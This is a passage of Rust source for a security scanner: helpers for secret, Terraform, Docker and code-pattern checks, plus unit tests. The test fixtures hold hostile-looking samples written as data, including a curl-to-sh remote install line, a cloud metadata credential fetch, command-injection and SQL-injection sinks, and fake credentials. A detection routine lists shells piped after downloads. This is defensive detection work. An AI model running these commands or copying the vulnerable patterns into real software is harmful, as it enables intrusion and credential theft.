        .is_some_and(|value| value.eq_ignore_ascii_case("php"))
}

fn is_ruby_like(file: &Path) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    file.extension()
        .and_then(|value| value.to_str())
        .is_some_and(|value| value.eq_ignore_ascii_case("rb"))
        || lower.ends_with("gemfile")
        || lower.ends_with(".rake")
}

fn is_go_like(file: &Path) -> bool {
    file.extension()
        .and_then(|value| value.to_str())
        .is_some_and(|value| value.eq_ignore_ascii_case("go"))
}

fn is_csharp_like(file: &Path) -> bool {
    file.extension()
        .and_then(|value| value.to_str())
        .is_some_and(|value| matches!(value.to_ascii_lowercase().as_str(), "cs" | "csx"))
}

fn generic_sast_pattern_applies_to_file(file: &Path, needle: &str) -> bool {
    let lower = file.to_string_lossy().to_ascii_lowercase();
    let extension = file
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    match needle {
        "eval(" | "innerHTML" => matches!(
            extension.as_str(),
            "js" | "jsx" | "ts" | "tsx" | "html" | "htm" | "vue" | "svelte" | "astro"
        ),
        "Runtime.getRuntime().exec" => {
            matches!(extension.as_str(), "java" | "kt" | "kts" | "groovy")
                || lower.ends_with(".gradle")
        }
        _ => true,
    }
}

fn parse_json_dependency_entry(line: &str) -> Option<(&str, &str)> {
    let trimmed = line.trim().trim_end_matches(',');
    let trimmed = trimmed.strip_prefix('"')?;
    let (name, remainder) = trimmed.split_once('"')?;
    let remainder = remainder.trim_start();
    let remainder = remainder.strip_prefix(':')?.trim_start();
    let remainder = remainder.strip_prefix('"')?;
    let (spec, _) = remainder.split_once('"')?;
    Some((name, spec))
}

fn brace_delta(line: &str) -> isize {
    let opens = line.chars().filter(|character| *character == '{').count() as isize;
    let closes = line.chars().filter(|character| *character == '}').count() as isize;
    opens - closes
}

fn extract_inline_secret_token(value: &str) -> String {
    value
        .trim_start()
        .trim_matches(|character: char| matches!(character, '"' | '\'' | ':' | ' '))
        .chars()
        .take_while(|character| character.is_ascii_alphanumeric() || "-_.+/=:".contains(*character))
        .collect()
}

fn extract_prefixed_url_token(line: &str, prefix: &str) -> Option<String> {
    let start = line.find(prefix)?;
    let tail = &line[start..];
    let token = tail
        .split(|character: char| {
            character.is_whitespace()
                || matches!(
                    character,
                    '"' | '\'' | ')' | ']' | '}' | '<' | '>' | ',' | ';'
                )
        })
        .next()
        .unwrap_or_default()
        .trim_end_matches('/')
        .to_string();

    if token.is_empty() {
        return None;
    }

    Some(token)
}

fn extract_http_header(line: &str) -> Option<(String, &str)> {
    let trimmed = line.trim();
    let (name, value) = trimmed.split_once(':')?;
    let name = name.trim().to_string();
    if name.is_empty() {
        return None;
    }
    Some((name, value.trim()))
}

fn extract_connection_string_value(line: &str, key: &str) -> Option<String> {
    for segment in line.split(';') {
        let (name, value) = segment.split_once('=')?;
        let normalized_name = normalize_identifier(name);
        if normalized_name == key {
            let token = trim_wrapping_quotes(value.trim()).to_string();
            if !token.is_empty() {
                return Some(token);
            }
        }
    }

    None
}

fn find_line_number(contents: &str, needle: &str) -> Option<usize> {
    let needle_lower = needle.to_ascii_lowercase();
    contents.lines().enumerate().find_map(|(index, line)| {
        if line.to_ascii_lowercase().contains(&needle_lower) {
            Some(index + 1)
        } else {
            None
        }
    })
}

fn find_first_line(contents: &str, needles: &[&str]) -> Option<usize> {
    let needles = needles
        .iter()
        .map(|needle| needle.to_ascii_lowercase())
        .collect::<Vec<_>>();

    contents.lines().enumerate().find_map(|(index, line)| {
        let line_lower = line.to_ascii_lowercase();
        needles
            .iter()
            .any(|needle| line_lower.contains(needle))
            .then_some(index + 1)
    })
}

fn find_trigger_line(contents: &str, trigger: &str) -> Option<usize> {
    contents.lines().enumerate().find_map(|(index, line)| {
        let trimmed = line.trim();
        if trimmed == trigger
            || trimmed == format!("{trigger}:")
            || trimmed == format!("\"{trigger}\"")
            || trimmed == format!("\"{trigger}\":")
        {
            Some(index + 1)
        } else {
            None
        }
    })
}

fn github_action_uses_entries(contents: &str) -> Vec<(usize, String, String)> {
    let mut entries = Vec::new();

    for (index, line) in contents.lines().enumerate() {
        let trimmed = line.trim();
        let uses_segment = trimmed.strip_prefix("- ").unwrap_or(trimmed);
        let Some(remainder) = uses_segment.strip_prefix("uses:") else {
            continue;
        };
        let value = remainder.trim().trim_matches('"').trim_matches('\'');

        if value.starts_with("docker://") {
            entries.push((index + 1, value.to_string(), String::new()));
            continue;
        }

        let Some((action, reference)) = value.split_once('@') else {
            continue;
        };
        entries.push((index + 1, action.to_string(), reference.to_string()));
    }

    entries
}

fn is_first_party_github_action(action: &str) -> bool {
    matches!(
        action.split('/').next().unwrap_or_default(),
        "actions" | "github"
    )
}

fn is_pinned_action_reference(reference: &str) -> bool {
    reference.len() == 40
        && reference
            .chars()
            .all(|character| character.is_ascii_hexdigit())
}

fn parse_docker_from_line(line: &str) -> Option<(String, Option<String>)> {
    let trimmed = line.trim();
    let remainder = trimmed
        .strip_prefix("FROM ")
        .or_else(|| trimmed.strip_prefix("from "))?;
    let mut tokens = remainder.split_whitespace();
    let mut image = None;

    while let Some(token) = tokens.next() {
        if token.starts_with("--") {
            continue;
        }
        image = Some(token.to_string());
        break;
    }

    let image = image?;
    let remainder_lower = remainder.to_ascii_lowercase();
    let stage_name = if let Some(as_index) = remainder_lower.find(" as ") {
        let alias = remainder[as_index + 4..]
            .split_whitespace()
            .next()
            .unwrap_or_default()
            .trim();
        if alias.is_empty() {
            None
        } else {
            Some(alias.to_string())
        }
    } else {
        None
    };

    Some((image, stage_name))
}

#[derive(Clone, Copy)]
enum TerraformSensitiveBlockKind {
    Output,
    Variable,
}

struct TerraformSensitiveBlock {
    kind: TerraformSensitiveBlockKind,
    name: String,
    depth: i32,
    flagged: bool,
}

fn parse_terraform_sensitive_named_block_header(
    line: &str,
) -> Option<(TerraformSensitiveBlockKind, String)> {
    for (prefix, kind) in [
        ("output \"", TerraformSensitiveBlockKind::Output),
        ("variable \"", TerraformSensitiveBlockKind::Variable),
    ] {
        let Some(remainder) = line.strip_prefix(prefix) else {
            continue;
        };
        let (name, _) = remainder.split_once('"')?;
        if name.is_empty() {
            continue;
        }
        return Some((kind, name.to_string()));
    }

    None
}

fn terraform_sensitive_false_assignment(line: &str) -> bool {
    let (key, value) = match line.split_once('=') {
        Some(parts) => parts,
        None => return false,
    };

    key.trim() == "sensitive" && trim_wrapping_quotes(value.trim()) == "false"
}

fn terraform_brace_delta(line: &str) -> i32 {
    line.chars().fold(0, |delta, character| match character {
        '{' => delta + 1,
        '}' => delta - 1,
        _ => delta,
    })
}

fn terraform_sensitive_attribute_key(identifier: &str) -> bool {
    if !is_sensitive_identifier(identifier) {
        return false;
    }

    ![
        "secretname",
        "secret_name",
        "secretarn",
        "secret_arn",
        "secretid",
        "secret_id",
        "secretpath",
        "secret_path",
        "secreturl",
        "secret_url",
        "secreturi",
        "secret_uri",
        "secretversion",
        "secret_version",
        "passwordpolicy",
        "password_policy",
        "tokenurl",
        "token_url",
        "tokenuri",
        "token_uri",
    ]
    .iter()
    .any(|safe_name| identifier == *safe_name)
}

fn parse_docker_user_line(line: &str) -> Option<String> {
    let trimmed = line.trim();
    let remainder = trimmed
        .strip_prefix("USER ")
        .or_else(|| trimmed.strip_prefix("user "))?;
    let user = remainder
        .split_whitespace()
        .next()
        .unwrap_or_default()
        .trim_end_matches(',');
    if user.is_empty() {
        None
    } else {
        Some(user.to_string())
    }
}

fn is_explicit_root_docker_user(user: &str) -> bool {
    let normalized = trim_wrapping_quotes(user.trim());
    if normalized.is_empty() || normalized.contains('$') {
        return false;
    }

    let primary = normalized.split(':').next().unwrap_or(normalized).trim();
    primary.eq_ignore_ascii_case("root") || primary == "0"
}

fn docker_pipeline_executes_shell(command: &str) -> bool {
    command.split('|').skip(1).any(|segment| {
        let trimmed = segment.trim().trim_start_matches('\\').trim();
        trimmed.starts_with("sh ")
            || trimmed == "sh"
            || trimmed.starts_with("/bin/sh")
            || trimmed.starts_with("bash ")
            || trimmed == "bash"
            || trimmed.starts_with("/bin/bash")
            || trimmed.starts_with("ash ")
            || trimmed == "ash"
            || trimmed.starts_with("zsh ")
            || trimmed == "zsh"
            || trimmed.starts_with("pwsh ")
            || trimmed == "pwsh"
            || trimmed.starts_with("powershell ")
            || trimmed == "powershell"
            || trimmed.starts_with("iex ")
            || trimmed == "iex"
    })
}

fn looks_sensitive_cookie_name(name: &str) -> bool {
    [
        "session",
        "sessionid",
        "sid",
        "auth",
        "authtoken",
        "token",
        "jwt",
        "accesstoken",
        "refreshtoken",
    ]
    .iter()
    .any(|needle| name.contains(needle))
}

#[derive(Clone, Copy)]
struct PrefixedSecretRule {
    id: &'static str,
    title: &'static str,
    detail: &'static str,
    severity: Severity,
    confidence: Confidence,
    prefix: &'static str,
    min_length: usize,
    max_length: Option<usize>,
    allowed_characters: CharacterClass,
}

#[derive(Clone, Copy)]
enum CharacterClass {
    UpperAlphaNumeric,
    UrlSafe,
    UrlSafeDots,
    Slack,
}

impl CharacterClass {
    fn allows(self, character: char) -> bool {
        match self {
            Self::UpperAlphaNumeric => character.is_ascii_uppercase() || character.is_ascii_digit(),
            Self::UrlSafe => {
                character.is_ascii_alphanumeric() || character == '_' || character == '-'
            }
            Self::UrlSafeDots => {
                character.is_ascii_alphanumeric()
                    || character == '_'
                    || character == '-'
                    || character == '.'
            }
            Self::Slack => {
                character.is_ascii_alphanumeric() || character == '-' || character == '_'
            }
        }
    }
}

#[cfg(test)]
mod tests {
    #[cfg(unix)]
    use std::os::unix::fs::PermissionsExt;
    use std::path::{Path, PathBuf};
    use std::process::Command;
    use std::sync::atomic::{AtomicUsize, Ordering};

    use super::{
        cargo_dependency_snapshot, generic_sast_pattern_applies_to_file, rust_test_line_mask,
        ArtifactScanner, BasicSastScanner, ConfigScanner, DependencyScanner, PolicyScanner,
        Scanner, SecretScanner,
    };
    use crate::core::config::{ConfigSource, ResolvedConfig};
    use crate::core::context::{ExecutionContext, ProtectedAction};
    use crate::core::findings::{Confidence, Severity};
    use crate::core::policy::EnforcementMode;
    use crate::core::receipts::ReceiptIndex;
    use std::fs;

    static TEST_COUNTER: AtomicUsize = AtomicUsize::new(0);

    #[test]
    fn detects_private_key_material_in_text_files() {
        let (context, root) = test_context(&[(
            "keys/deploy.key",
            "-----BEGIN OPENSSH PRIVATE KEY-----\nvery-secret\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Private key")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_docker_client_auth_config_paths() {
        let (context, root) = test_context(&[(
            ".docker/config.json",
            "{\n  \"auths\": {\n    \"registry.example.com\": {\n      \"auth\": \"dXNlcjpzZWNyZXQ=\"\n    }\n  }\n}\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.title.contains("Credential-bearing file path")
                && finding.location().contains(".docker/config.json")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_variable_secret_paths() {
        let (context, root) = test_context(&[(
            "environments/prod.auto.tfvars",
            "db_password = \"super-secret-value\"\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.title.contains("Infrastructure variable file")
                && finding.location().contains("prod.auto.tfvars")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_public_storage_and_wildcard_iam_posture() {
        let (context, root) = test_context(&[(
            "infra/storage.tf",
            "resource \"aws_s3_bucket_public_access_block\" \"assets\" {\n  bucket = aws_s3_bucket.assets.id\n  block_public_policy = false\n}\n\ndata \"aws_iam_policy_document\" \"bucket\" {\n  statement {\n    principals {\n      type = \"AWS\"\n      identifiers = [\"*\"]\n    }\n    actions = [\"*\"]\n    resources = [\"*\"]\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("allow public object storage exposure")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("IAM policy uses a wildcard principal")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("IAM policy uses wildcard actions or resources")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_public_admin_ingress() {
        let (context, root) = test_context(&[(
            "infra/network.tf",
            "resource \"aws_security_group\" \"admin\" {\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("exposes an administrative port publicly")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_public_sensitive_service_ingress() {
        let (context, root) = test_context(&[(
            "infra/database.tf",
            "resource \"aws_security_group\" \"database\" {\n  ingress {\n    from_port   = 5432\n    to_port     = 5432\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.id == "config.terraform.public-sensitive-service-ingress" }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_terraform_public_web_ingress_for_standard_service_ports() {
        let (context, root) = test_context(&[(
            "infra/web.tf",
            "resource \"aws_security_group\" \"web\" {\n  ingress {\n    from_port   = 443\n    to_port     = 443\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.terraform.public-sensitive-service-ingress"),
            "expected no public-sensitive-service-ingress finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_public_all_ports_ingress() {
        let (context, root) = test_context(&[(
            "infra/network.tf",
            "resource \"aws_security_group\" \"open\" {\n  ingress {\n    from_port   = 0\n    to_port     = 65535\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.terraform.public-all-ports-ingress"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_terraform_non_public_all_ports_rules() {
        let (context, root) = test_context(&[(
            "infra/network.tf",
            "resource \"aws_security_group\" \"internal\" {\n  ingress {\n    from_port   = 0\n    to_port     = 65535\n    protocol    = \"-1\"\n    cidr_blocks = [\"10.0.0.0/8\"]\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.terraform.public-all-ports-ingress"),
            "expected no public-all-ports-ingress finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_inline_literal_secret_attributes() {
        let (context, root) = test_context(&[(
            "infra/database.tf",
            "resource \"aws_db_instance\" \"main\" {\n  username        = \"app\"\n  master_password = \"hunter22\"\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.terraform.inline-secret-attribute"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_terraform_secret_metadata_and_variable_references() {
        let (context, root) = test_context(&[(
            "infra/secrets.tf",
            "resource \"aws_secretsmanager_secret_version\" \"app\" {\n  secret_id     = aws_secretsmanager_secret.app.id\n  secret_string = var.app_secret\n}\nresource \"aws_lambda_function\" \"api\" {\n  kms_key_arn = aws_kms_key.main.arn\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.terraform.inline-secret-attribute"),
            "expected no inline-secret-attribute finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_s3_backend_with_encryption_disabled() {
        let (context, root) = test_context(&[(
            "infra/backend.tf",
            "terraform {\n  backend \"s3\" {\n    bucket  = \"state-bucket\"\n    key     = \"prod/terraform.tfstate\"\n    region  = \"us-east-1\"\n    encrypt = false\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.id == "config.terraform.backend.s3-encryption-disabled" }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_http_backend_with_insecure_transport() {
        let (context, root) = test_context(&[(
            "infra/backend.tf",
            "terraform {\n  backend \"http\" {\n    address        = \"http://state.example.com/terraform.tfstate\"\n    lock_address   = \"http://state.example.com/terraform.lock\"\n    unlock_address = \"http://state.example.com/terraform.unlock\"\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.terraform.backend.insecure-http"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_terraform_http_backend_when_transport_is_https() {
        let (context, root) = test_context(&[(
            "infra/backend.tf",
            "terraform {\n  backend \"http\" {\n    address        = \"https://state.example.com/terraform.tfstate\"\n    lock_address   = \"https://state.example.com/terraform.lock\"\n    unlock_address = \"https://state.example.com/terraform.unlock\"\n  }\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.terraform.backend.insecure-http"),
            "expected no insecure-http backend finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_secret_output_with_sensitive_disabled() {
        let (context, root) = test_context(&[(
            "infra/outputs.tf",
            "output \"db_password\" {\n  value     = aws_db_instance.main.password\n  sensitive = false\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.id == "config.terraform.output.secret-sensitive-false" }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_terraform_secret_variable_with_sensitive_disabled() {
        let (context, root) = test_context(&[(
            "infra/variables.tf",
            "variable \"api_token\" {\n  type      = string\n  sensitive = false\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| { finding.id == "config.terraform.variable.secret-sensitive-false" }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_non_secret_terraform_output_with_sensitive_disabled() {
        let (context, root) = test_context(&[(
            "infra/outputs.tf",
            "output \"service_url\" {\n  value     = aws_lb.main.dns_name\n  sensitive = false\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| { finding.id != "config.terraform.output.secret-sensitive-false" }),
            "expected no secret-sensitive-false output finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_inline_authorization_credentials_but_ignores_placeholders() {
        let (context, root) = test_context(&[(
            "src/request.txt",
            "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature\nAuthorization: Bearer example-token\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Inline bearer token")));
        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.title.contains("Inline bearer token"))
                .count(),
            1
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_inline_http_secret_headers_but_ignores_placeholders() {
        let (context, root) = test_context(&[(
            "requests.http",
            "X-API-Key: sk_test_not_real_example\nX-API-Key: a1b2c3d4e5f6g7h8i9j0k1l2\nX-Auth-Token: example-token\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.title.contains("Inline HTTP secret header"))
                .count(),
            1
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_registry_credentials_in_package_auth_files() {
        let (context, root) = test_context(&[
            (
                ".npmrc",
                "//registry.npmjs.org/:_authToken=npm_1234567890abcdefghijklmnop\n",
            ),
            (".netrc", "machine registry.example.com login ci-user password s3cr3tpassw0rdvalue\n"),
            (".pypirc", "[pypi]\nusername = __token__\npassword = pypi-AgENdGVzdC5weXBpLm9yZwIkfakebutlongtokenvalue\n"),
        ]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Registry credential detected in .npmrc")
        }));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Credential detected in .netrc")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Credential detected in .pypirc")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_service_webhook_urls_but_ignores_placeholder_values() {
        let (context, root) = test_context(&[(
            "notifications.txt",
            "Slack: https://hooks.slack.com/services/T12345678/B12345678/abcdefghijklmnopqrstuvwxyz123456\nDiscord: https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\nPlaceholder: https://hooks.slack.com/services/example/webhook/token_example\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.title.contains("webhook URL detected"))
                .count(),
            2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_remote_script_execution_in_workflow_as_high_severity() {
        let (context, root) = test_context(&[(
            ".github/workflows/install.yml",
            "steps:\n  - run: curl -fsSL https://example.com/install.sh | sh\n",
        )]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.title.contains("Remote script execution pattern")
                && finding.severity == Severity::High
                && finding.confidence == Confidence::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_remote_script_execution_in_docs_as_medium_severity() {
        let (context, root) = test_context(&[(
            "docs/install.md",
            "Run `curl -fsSL https://example.com/install.sh | sh` to install.\n",
        )]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.title.contains("Remote script execution pattern")
                && finding.severity == Severity::Medium
                && finding.confidence == Confidence::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_request_driven_command_execution_sinks() {
        let (context, root) = test_context(&[
            (
                "server/routes.ts",
                "import { exec } from \"node:child_process\";\napp.get('/run', (req, res) => exec(req.query.cmd as string));\n",
            ),
            (
                "worker.py",
                "import subprocess\nsubprocess.run(request.args['cmd'], shell=True)\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(
            findings
                .iter()
                .filter(|finding| {
                    finding
                        .title
                        .contains("Untrusted input reaches a command execution sink")
                })
                .count()
                >= 2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_ssrf_patterns_from_untrusted_urls_and_metadata_access() {
        let (context, root) = test_context(&[
            (
                "api/fetch.ts",
                "const response = await fetch(req.query.url as string);\n",
            ),
            (
                "internal/client.py",
                "requests.get(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| finding
            .title
            .contains("Untrusted input appears to drive an outbound URL fetch")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("cloud metadata endpoint")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_request_driven_filesystem_sinks() {
        let (context, root) = test_context(&[
            (
                "handlers/download.py",
                "return send_file(request.args['path'])\n",
            ),
            (
                "pages/file.php",
                "<?php echo file_get_contents($_GET['page']); ?>\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(
            findings
                .iter()
                .filter(|finding| {
                    finding
                        .title
                        .contains("Untrusted input reaches a filesystem path sink")
                })
                .count()
                >= 2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_unsafe_deserialization_primitives() {
        let (context, root) = test_context(&[
            ("jobs/load.py", "obj = yaml.load(request.data)\n"),
            (
                "legacy/session.php",
                "<?php $obj = unserialize($_POST['blob']); ?>\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(
            findings
                .iter()
                .filter(|finding| {
                    finding
                        .title
                        .contains("Unsafe deserialization primitive detected")
                })
                .count()
                >= 2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_sql_injection_patterns_from_untrusted_input() {
        let (context, root) = test_context(&[
            (
                "server/users.ts",
                "const rows = await db.query(`SELECT * FROM users WHERE id = ${req.query.id}`);\n",
            ),
            (
                "api/users.py",
                "cursor.execute(f\"SELECT * FROM users WHERE id = {request.args['id']}\")\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(
            findings
                .iter()
                .filter(|finding| {
                    finding
                        .title
                        .contains("Untrusted input appears to reach a SQL query string")
                })
                .count()
                >= 2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_insecure_randomness_for_secret_generation() {
        let (context, root) = test_context(&[
            (
                "server/session.ts",
                "const sessionToken = Math.random().toString(36).slice(2);\n",
            ),
            (
                "api/reset.py",
                "reset_token = ''.join(random.choice(alphabet) for _ in range(32))\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(
            findings
                .iter()
                .filter(|finding| {
                    finding
                        .title
                        .contains("Non-cryptographic randomness appears to generate a secret or token")
                })
                .count()
                >= 2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_non_secret_randomness_and_crypto_safe_generators() {
        let (context, root) = test_context(&[
            (
                "server/session.ts",
                "const sessionToken = crypto.randomUUID();\n",
            ),
            (
                "api/reset.py",
                "reset_token = secrets.token_urlsafe(32)\n",
            ),
            (
                "ui/chart.js",
                "const randomColor = Math.random() * 255;\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.is_empty(), "expected no findings, got: {findings:#?}");
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_unsafe_crypto_primitives() {
        let (context, root) = test_context(&[
            (
                "server/auth.ts",
                "const passwordHash = crypto.createHash('md5').update(req.body.password).digest('hex');\n",
            ),
            (
                "crypto/legacy.py",
                "cipher = AES.new(key, AES.MODE_ECB)\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(
            findings
                .iter()
                .filter(|finding| {
                    finding
                        .title
                        .contains("Unsafe cryptographic primitive or mode detected")
                })
                .count()
                >= 2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_safe_crypto_primitives_and_non_secret_checksums() {
        let (context, root) = test_context(&[
            (
                "server/auth.ts",
                "const passwordHash = crypto.createHash('sha256').update(req.body.password).digest('hex');\n",
            ),
            (
                "crypto/modern.py",
                "cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n",
            ),
            (
                "util/checksum.py",
                "digest = hashlib.md5(data).hexdigest()\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.is_empty(), "expected no findings, got: {findings:#?}");
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_upload_writes_and_archive_extraction_from_request_context() {
        let (context, root) = test_context(&[
            (
                "api/upload.py",
                "request.files['avatar'].save('/srv/uploads/' + request.files['avatar'].filename)\n",
            ),
            (
                "api/import.py",
                "zipfile.ZipFile(request.files['bundle']).extractall('/srv/imports')\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Uploaded file appears to be written directly from request context")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Uploaded archive appears to be extracted directly from request context")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_non_request_archive_extraction_and_non_upload_file_writes() {
        let (context, root) = test_context(&[
            (
                "api/upload.py",
                "stored_file.save(storage_path)\n",
            ),
            (
                "api/import.py",
                "zipfile.ZipFile(local_archive_path).extractall('/srv/imports')\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.is_empty(), "expected no findings, got: {findings:#?}");
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_authz_bypass_patterns() {
        let (context, root) = test_context(&[
            (
